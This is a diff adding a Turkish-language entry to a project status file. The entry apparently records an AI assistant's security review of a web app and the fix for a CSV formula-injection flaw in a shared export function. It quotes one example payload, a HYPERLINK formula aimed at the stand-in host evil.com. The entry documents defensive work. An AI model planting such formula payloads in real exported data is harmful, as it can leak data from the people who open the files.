@@ -1,5 +1,46 @@
 # PROJECT_STATUS.md
 
+## 2026-09-14 (devam 14) — CSV/formül enjeksiyonu kapatıldı (`b147308`)
+
+Kullanıcı "başka yapabileceğin güvenlik testi var mı" diye sordu. Ek bir
+tarama yapıldı: Zod şemalarındaki `.passthrough()` kullanımları (yalnızca
+salt-okunur sorgu filtrelerinde, hiçbir yazma yolunda değil — mass
+assignment riski yok), şablon/belge render motoru (`eval`/`new Function`/
+`vm` hiç kullanılmıyor — SSTI riski yok), ReDoS'a açık düzenli ifade
+deseni arandı (bulunmadı, tüm serbest metin alanları zaten Zod ile
+uzunluk sınırlı).
+
+**Bulunan gerçek açık:** `public/js/ui.js`'teki `UI.exportCsv()` — TÜM CSV
+dışa aktarım butonlarının (Ürünler, Partiler, Kullanıcılar, Raporlar,
+Denetim Kaydı, Muhasebe Aktarımı) kullandığı tek paylaşılan fonksiyon —
+yalnızca çift tırnakları kaçışlıyordu, hücre değerinin `=`/`+`/`-`/`@` ile
+başladığı durumu hiç ele almıyordu (OWASP "CSV Injection"). Bir müşteri/
+ürün adı `=HYPERLINK("http://evil.com",...)` gibi ayarlanırsa, CSV
+Excel/Sheets'te açıldığında hücre metin değil FORMÜL olarak çalışır —
+veri sızıntısı veya (eski Excel'lerde DDE ile) komut çalıştırma riski.
+Düzeltme: değer tehlikeli bir karakterle başlıyorsa başına tek tırnak (`'`)
+ekleniyor (Excel/Sheets'in "zorla metin" kuralı) — görünen değer
+değişmiyor, formül olarak yorumlanması engelleniyor. Tek fonksiyondaki
+düzeltme uygulamadaki TÜM CSV dışa aktarımlarını aynı anda kapatıyor.
+
+`test/security.js`'e gerçek davranışsal test eklendi: jsdom'da
+`UI.exportCsv` 5 farklı formül payload'ıyla çağrılıyor, `Blob`
+constructor'ı mock'lanarak üretilen CSV içeriği yakalanıyor, hiçbirinin
+ham formül karakteriyle kalmadığı kanıtlanıyor.
+
+**Doğrulama:** `npm run typecheck`/`lint`/`build` temiz. `node
+test/run-all.js` → 28/28 suite geçti (`security.js` kendi içinde 60/60).
+
+**Kullanıcıya verilen nihai değerlendirme:** kod seviyesinde pratik olarak
+yapılabilecek güvenlik testleri (kimlik doğrulama/yetkilendirme, enjeksiyon
+sınıfları — SQL/komut/XXE/SSTI/CSV, XSS, dosya yükleme, oturum yönetimi,
+sırlar, güvenlik başlıkları, rate-limit atlatma, CSRF, mass assignment,
+ReDoS) tüketildi. Geriye kalanlar bu ortamda YAPILAMAZ: gerçek bir ağ/TLS
+sızma testi, ölçekte DoS dayanıklılığı, bağımlılık karışıklığı (dependency
+confusion) saldırıları, fiziksel/sosyal mühendislik faktörleri — bunlar
+özel araç/ortam gerektirir, canlıya almadan önce bağımsız bir sızma testi
+önerisi geçerliliğini koruyor.
+
 ## 2026-09-14 (devam 13) — Kapsamlı güvenlik denetimi (`9333dcf`)
 
 Kullanıcı "sistemi tüm güvenlik testleriyle test et, güvenli olduğuna emin
